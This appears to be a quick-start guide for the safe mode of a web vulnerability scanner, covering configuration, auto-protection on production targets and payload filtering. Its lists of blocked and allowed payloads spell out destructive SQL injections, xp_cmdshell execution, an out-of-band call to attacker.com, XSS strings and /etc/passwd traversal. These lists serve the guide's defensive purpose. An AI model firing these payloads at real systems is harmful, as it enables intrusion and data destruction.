# Safe Mode - Quick Start Guide

Get up and running with Kinetic's safe mode and production guardrails in 5 minutes.

## 🚀 Quick Start

### 1. Enable Safe Mode in Configuration

```json
{
  "target": {
    "url": "https://staging.example.com"
  },
  "scanners": {
    "active": {
      "enabled": true,
      "safeMode": true
    }
  }
}
```

### 2. Run the Scan

```bash
kinetic --config ./config.json
```

**Result**: Destructive payloads are automatically filtered. Safe vulnerability testing proceeds.

## 📋 Common Scenarios

### Scenario 1: Local Testing (No Guardrails Needed)

```json
{
  "target": {
    "url": "http://localhost:3000"
  },
  "scanners": {
    "active": {
      "enabled": true,
      "safeMode": false
    }
  }
}
```

**What happens:**
- All payloads are used (including destructive ones)
- No environment warnings
- Full vulnerability testing

### Scenario 2: Staging Environment (Safe Mode Recommended)

```json
{
  "target": {
    "url": "https://staging.myapp.com"
  },
  "scanners": {
    "active": {
      "enabled": true,
      "safeMode": true
    }
  }
}
```

**What happens:**
- Safe mode enabled
- Destructive payloads filtered
- XSS, SQLi detection still works
- Security warnings logged

### Scenario 3: Production Environment (Auto-Protected)

```json
{
  "target": {
    "url": "https://production.myapp.com"
  },
  "scanners": {
    "active": {
      "enabled": true,
      "safeMode": false
    }
  }
}
```

**What happens:**
- ⚠️ Safe mode is AUTO-ENABLED despite config
- Destructive payloads blocked
- Security warnings logged
- Scan proceeds safely

```
[ScanEngine] Target is non-local (non-localhost). Automatically enabling safe mode to prevent destructive payloads.
[ScanEngine] SECURITY WARNING: Active scanning is enabled on production target.
```

### Scenario 4: Production Passive Scanning (Recommended)

```json
{
  "target": {
    "url": "https://production.myapp.com"
  },
  "scanners": {
    "passive": {
      "enabled": true
    },
    "active": {
      "enabled": false
    }
  }
}
```

**What happens:**
- Only passive scanning (no payload injection)
- No data modification risk
- Safe for production
- Detects security headers, encryption issues, etc.

## 🔍 Verify Safe Mode is Working

### Check 1: Review Payload Filtering

```typescript
import { PayloadFilter } from '@tzigger/kinetic';

const filter = new PayloadFilter();

// This should be safe
console.log(filter.isSafe("' OR '1'='1"));  // true

// This should be dangerous
console.log(filter.isSafe("'; DROP TABLE users--"));  // false

// Get stats
const stats = filter.getFilterStats([
  "' OR '1'='1",
  "'; DROP TABLE users--",
  "' UNION SELECT 1--",
]);

console.log(stats);
// { total: 3, safe: 2, dangerous: 1, warning: 0 }
```

### Check 2: Test Target Validation

```typescript
import { TargetValidator } from '@tzigger/kinetic';

const validator = new TargetValidator();

// Check target environment
const result = validator.validateUrl('https://production.example.com');

console.log(result.isProduction);  // true
console.log(result.isLocal);        // false
console.log(result.warnings);       // [...warnings...]

// Get formatted summary
console.log(validator.getSummary('https://production.example.com'));
```

### Check 3: Look for Console Warnings

When running a scan on production:

```
[TargetValidator] Validated target: production.example.com (production) - isLocal: false, isProduction: true
[ScanEngine] Target is non-local (non-localhost). Automatically enabling safe mode to prevent destructive payloads.
[PayloadFilter] Filtered out 5 destructive payload(s) in safe mode. (18/23 payloads remain safe)
```

## 🎯 Testing Checklist

- [ ] Run scan on localhost with `safeMode: false` - all payloads used
- [ ] Run scan on staging with `safeMode: true` - destructive payloads blocked
- [ ] Run scan on production with `safeMode: false` - safe mode auto-enabled
- [ ] Verify console shows environment detection
- [ ] Verify destructive payloads are listed as blocked
- [ ] Check that XSS/SQLi detection still works

## 📊 What Gets Blocked?

### Blocked Payloads (Safe Mode)

```
'; DROP TABLE users--
'; DELETE FROM users--
'; TRUNCATE TABLE users--
' OR 1=1; UPDATE users SET admin=1--
'; EXEC xp_cmdshell('whoami');--
'; EXEC master..xp_dirtree '\\attacker.com\share'--
INSERT INTO users VALUES ('admin'--')
```

### Allowed Payloads (Safe Mode)

```
' OR '1'='1
' UNION SELECT NULL--
' AND SLEEP(5)--
' AND 1=CONVERT(int, (SELECT @@version))--
<script>alert(1)</script>
<img src=x onerror=alert(1)>
../../../etc/passwd
```

## 🔒 Security Best Practices

### For Your Team

1. **Default to Safe**: Always enable safe mode on non-local environments
2. **Explicit Approval**: Require written approval for production active scans
3. **Passive First**: Start with passive scanning on production
4. **Log Everything**: Review logs after each scan
5. **Staged Rollout**: Test on localhost → staging → production

### Configuration Examples

**Safe Defaults**
```json
{
  "scanners": {
    "passive": {
      "enabled": true
    },
    "active": {
      "enabled": true,
      "safeMode": true,
      "aggressiveness": "low"
    }
  }
}
```

**Aggressive Staging**
```json
{
  "scanners": {
    "active": {
      "enabled": true,
      "safeMode": true,
      "aggressiveness": "aggressive"
    }
  }
}
```

**Production (Read-Only)**
```json
{
  "scanners": {
    "passive": {
      "enabled": true
    },
    "active": {
      "enabled": false
    }
  }
}
```

## 🐛 Troubleshooting

### "Payload blocked by safe mode" Error

**Cause**: You're using a destructive payload with safe mode enabled.

**Solution**: 
- Disable safe mode only on localhost
- Use the payload only for testing, not on live systems

```typescript
// Good: Safe mode off on localhost
if (url.includes('localhost')) {
  injector.setSafeMode(false);
}

// Bad: Safe mode off on production
if (url.includes('production')) {
  injector.setSafeMode(false);  // DON'T DO THIS!
}
```

### Safe Mode Enabled Unexpectedly

**Cause**: You're scanning a non-local target. Safe mode auto-enables.

**This is intentional!** It prevents accidental data loss.

**To explicitly allow it:**
```typescript
const result = validator.shouldBlockActiveScan(url, {
  confirmProduction: true
});
```

### Destructive Payloads Not Filtered

**Cause**: Safe mode is disabled

**Solution**: 
```json
{
  "scanners": {
    "active": {
      "safeMode": true
    }
  }
}
```

Or programmatically:
```typescript
injector.setSafeMode(true);
```

## 📖 Learn More

- **Full Documentation**: See [`SAFE-MODE.md`](./SAFE-MODE.md)
- **API Reference**: See [`SAFE-MODE-API.md`](./SAFE-MODE-API.md)
- **Configuration**: See [`config/default.config.json`](../config/default.config.json)

## ❓ FAQ

**Q: Does safe mode slow down scanning?**  
A: No, filtering has negligible performance impact.

**Q: Can I disable auto-enablement for production?**  
A: No, it's a safety feature. You can use passive scanning instead.

**Q: Are all XSS payloads safe?**  
A: Yes, XSS payloads only test if input is reflected, they don't modify data.

**Q: What about blind SQL injection?**  
A: Time-based blind SQLi (SLEEP, WAITFOR) is allowed in safe mode.

**Q: Can I add custom payloads in safe mode?**  
A: Custom payloads go through the same safety filter.

**Q: Is this PCI DSS compliant?**  
A: Safe mode helps with PCI DSS 11.3 (penetration testing requirements).

## 🎉 You're Ready!

You now have:
- ✅ Safe mode configured
- ✅ Production guardrails enabled
- ✅ Automatic environment detection
- ✅ Payload filtering active
- ✅ Security warnings in place

Happy testing! 🔐
